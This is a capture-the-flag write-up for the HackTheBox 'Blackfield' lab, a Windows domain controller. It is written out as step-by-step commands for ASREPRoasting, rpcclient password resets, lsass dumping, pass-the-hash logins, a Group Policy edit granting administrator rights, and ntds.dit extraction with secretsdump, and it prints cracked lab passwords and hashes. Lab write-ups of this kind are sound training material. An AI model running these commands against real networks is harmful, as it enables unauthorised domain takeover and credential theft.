---
title: Writeup - HackTheBox - Blackfield
published: true
---
![](Pictures/Blackfield/logo.png)

This machine from HackTheBox is categorized as an “hard” Windows machine. From the beginning this machine required some enumeration on SMB to get a list of users of the system. With this list I was able todo a ASREPRoast attack. I got a hash for the user support. This user was able to change the password for the user svc_backup, who was in the Remote Management group. The user was also a member of the Backup Operators. With this knowledge I was able to put the user svc_backup into the administrators group and finally login as the administrator. In the end of this report I will also show an alternative solution where I mount the C: drive as a shadow copy and extract the ntds.dit and SYSTEM files.

## [](#header-2)Enumeration

### [](#header-3)Nmap
I started with an nmap scan to get a list of running services on
the machine.

```
nmap -sC -sV -Pn -oA nmap/nmap 10.10.10.192
```

![](Pictures/Blackfield/nmap1.png)

I put the domain name BLACKFIELD.local into the /etc/hosts file.

### [](#header-3)Smbclient
I wanted to get some more information about SMB so I used smbclient like this:

```
smbclient -L BLACKFIELD.local
```

![](Pictures/Blackfield/smbclient1.png)

I took a look at the share profiles$ and found a huge amount of folder with names that looked like usernames. I saved all names into a file, user.txt.

I show this more in detail in the video.

### [](#header-3)GetNPUsers.py

I wanted to see if I could get tokens from any users by doing a ASREPRoasting attack with GetNPUsers. I ran the script with my list of usernames.

```
Python GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt -formathashcat -outputfile hashes.asreproast
```

![](Pictures/Blackfield/getnpusers1.png)

This took a bit of time to run, due to the big list of usernames. When it was done I got the following:

![](Pictures/Blackfield/asreproast1.png)

I was able to crack the hash with JohnTheRipper.

![](Pictures/Blackfield/john1.png)

The password for the user support is #00^BlackKnight.

### [](#header-3)Rpcclient

I was able to use the creds for the support account and log in with the rpcclient. Then I ran the command, enumdomusers, to get alist of all usernames on the domain. The list was huge, because it was so many users on the domain. Here is the users that I found more interesting, probably more privileged users.

```
rpcclient -U support 10.10.10.192
```

```
enumdomusers
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
```

I added the users to another file, privusers.txt.

![](Pictures/Blackfield/privusers.png)

The account I am using with rpcclient is named support. What I read online is that accounts that is used by IT, helpdesk, supportetc often have some administrative privileges. What I could see from the privileges on the account support, this might be the caseeven here.

```
enumprivs
```

```
found 35 
privilegesSeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
```

If this is the case then maybe I can change password for some other users, according to <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux" target="_blank">mubix blog-post</a>. So I tried changing the password for the high privileged accounts, until I found that it worked on the audit2020 account:

```
set userinfo2 audit2020 23 ‘TestTest123!’
```

The password needs to be a bit complex to get this to work. This according to the password policy for the domain.

### [](#header-3)Forensic SMB share

So after a bit of testing different things I took a look at the SMB enumeration from earlier. There is a share called forensic. I logged in and listed the content with the user audit2020.

```
Smbclient -U audit2020 //10.10.10.192/forensic
```

![](Pictures/Blackfield/smbclient2.png)

On my Kali machine I created a folder, SMB, and a folder inside called forensic. Then I mounted the forensic share and copied all the files to my local machine.

```
sudo mount.cifs //10.10.10.192/forensic -o username=audit2020 /mnt/temp/
```

```
rsync -r --progress /mnt/temp/* .
```

Inside of the folder forensic/memory_analysis i found the following files:

![](Pictures/Blackfield/content1.png)

There is one file that look more interesting then the others, lsass.zip, so I unzipped it.

```
7z x lsass.zip
```

### [](#header-3)Pypykatz lsass.dmp

I used pypykatz to try to get something useful out of it.

```
Pypykatz lsa minidump lsass.DMP
```

![](Pictures/Blackfield/lsass1.png)

There is much information, but I only found the hash for the account svc_backup useful. With an NT hash there is a possibility to crack it or to it as pass-the-hash. After alot of testing with different things I found out that svc_backup is a member of the Remote Management Group (found this out using bloodhound)

## [](#header-2)Exploitation

### [](#header-3)Evil-winRM - user.txt flag

I tried to log with evil-winrm.

```
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
```

![](Pictures/Blackfield/evil1.png)

And I was able to get the user.txt flag.

### [](#header-3)Enumeration svc_backup

I did some enumeration with the current user svc_backup.

```
whoami /all
```

![](Pictures/Blackfield/groups.png)

I saw that the user svc_backup is a member of the Backup Operatorsgroup. This means that the user probably can change any file on the system. So what i did next was trying to get my self more privileges.

### [](#header-3)The GptTmpl.inf file

Inside of the following folder is a file that controls the privileges on the domain. GptTmpl.inf

C:\Windows\SYSVOL\domain\policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\machine\microsoft\windows nt\secedit\

If I could change this file and put the account svc_backup into the administrators group then I should be able to dump lsass.exe. I checked who was the members in the administrators group.

```
Net localgroup administrators
```

![](Pictures/Blackfield/netlocal.png)

The account svc_backup is not a member of the administrators group, yet.
The file GptTmpl.inf looks like this:

```
[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1

[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544

[Version]
signature="$CHICAGO$"
Revision=1
```

I wanted to change this file so the user svc_backup becomes a member of the administrators group. The whoami /all command gave me the information that the user svc_backup’s SID is:

```
S-1-5-21-4194615774-2175524697-3563712290-1413
```

I copied the content of the GptTmpl.inf file to a text editor on my local machine and added the following content in the end:

```
[Group Membership]
*S-1-5-21-4194615774-2175524697-3563712290-1413__Memberof = *S-1-5-32-544
*S-1-5-21-4194615774-2175524697-3563712290-1413__Members =
```

With this edit I put my self into the administrators group (S-1-5-32-544). I saved the file on my Kali system and uploaded it to thedomain controller with Evil-WinRM. I replaced the file in the secedit folder with the one that I uploaded.

```
robocopy.exe "C:\users\svc_backup\documents\" "C:\Windows\SYSVOL\domain\policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\machine\microsoft\windows nt\secedit" GptTmpl.inf /b
```

I now wanted to force update the group policy myself instead of waiting for it to happen.

```
Gpupdate /force
```

Then I ran the localgroup command again.

```
Net localgroup administrators
```

![](Pictures/Blackfield/netlocal2.png)

Now the user svc_backup is a member of the administrators group.


### [](#header-3)Dumping lsass.exe

The files that I copied before from the SMB share contains a directory, tools/sysinternals. There is a systool, procdump.exe. With this tool I can dump lsass.exe.

I upload the tool with evil-winrm and ran it like this:

```
.\procdump.exe -ma lsass.exe C:\Users\svc_backup\Documents\lsass.dmp
```

![](Pictures/Blackfield/procdump.png)

I got an successful dump and downloaded it to my Kali machine. Andthen I ran pypykatz to get something useful out of it.

```
Pypykatz lsa minidump lsass.dmp
```

![](Pictures/Blackfield/pypykatz1.png)

The output gave much data but there was the administrators NT hashand a cleartext password: 

```
###_ADM1N_3920_###.
```

### [](#header-3)Evil-winRM - root.txt flag

I was now able to login as the administrator with evil-winrm and read the root.txt flag.

```
evil-winrm -u administrator -p '###_ADM1N_3920_###' -i 10.10.10.192
```

![](Pictures/Blackfield/evil2.png)

## [](#header-2)Alterative solution

Mounting the system drive as shadow copy and extract the ntds.dit and SYSTEM files. Before I wrote this segment I did a reset of the machine to get rid of my administrative privileges.

Use Evil-WinRM to log in to the domain controller as svc_backup.Navigate to C:\Windows\Temp\.

To mount the C: drive as a shadowcopy doesn’t always work with thevssadmin tool with Evil-WinRM (I actually got it to work, but I don’t know exactly what I did). The command, if it works is:

```
vssadmin create shadow /for=C:
```

If this doesn’t work there is a simple script made by <a href="http://0xprashant.github.io" target="_blank">0xprashant</a>

For some reason you have to put a random char at the end of each line because the last char will be deleted?! In my example I put an “r”.

![](Pictures/Blackfield/evil3.png)

To mount the C: drive use the following command:

```
diskshadow /s script.txt
```

![](Pictures/Blackfield/evil4.png)

When the disk is mounted, in this case O: you can copy the ntds.dit file with robocopy.exe. Robocopy seems to be a standard tool in Windows since Windows Vista.

```
robocopy.exe "O:\Windows\NTDS" "C:\Windows\Temp" ntds.dit /b
```

If this for some reason doesn’t work try <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">this</a> method:

You also need the SYSTEM file from the Registry hive. You can copythe file with robocopy or just save it from the Registry.

```
reg save HKLM\SYSTEM C:\Windows\Temp\system
```

or

```
robocopy.exe "O:\Windows\system32\config" "C:\Windows\Temp" SYSTEM/b
```

Download the ntds.dit and the SYSTEM file to the local Kali machine.

![](Pictures/Blackfield/evil5.png)

![](Pictures/Blackfield/evil6.png)

When you have both files downloaded there is a python script, secretsdump.py, that can get the hashes from the dit file with help from the boot-key from the SYSTEMFILE.

```
python secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash > hashes.txt
```

![](Pictures/Blackfield/secretsdump1.png)

Now you will get all hashes from all the users from the Domain Controller. The last step is to log in as the Administrator using pass-the-hash with Evil-WinRM.

```
evil-winrm -u administrator -H 184fb5e5178480be64824d4cd53b99ee -i10.10.10.192
```

![](Pictures/Blackfield/evil7.png)

<iframe id="lbry-iframe" width="560" height="315" src="https://lbry.tv/$/embed/HackTheBox---Blackfield/741a30ffb1035f0833ef667a70b295f00e48881e" allowfullscreen></iframe>
